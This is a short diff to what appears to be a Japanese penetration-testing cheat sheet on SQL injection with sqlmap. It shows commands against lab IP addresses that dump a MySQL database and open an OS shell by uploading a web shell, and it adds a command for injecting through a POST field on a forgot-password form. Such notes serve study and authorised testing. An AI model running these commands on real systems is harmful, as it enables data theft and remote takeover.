@@ -193,7 +193,11 @@ sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
 # WebShellのアップロード
 sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --osshell
 	--os-shellを使用する。
+```
 
+- POSTリクエストへのSQLiの実行の場合
+```sh
+sudo sqlmap -u http://10.10.11.113:8080/forgot/ --data="email=admin%40admin.admin"
 ```
 
 ※参考資料
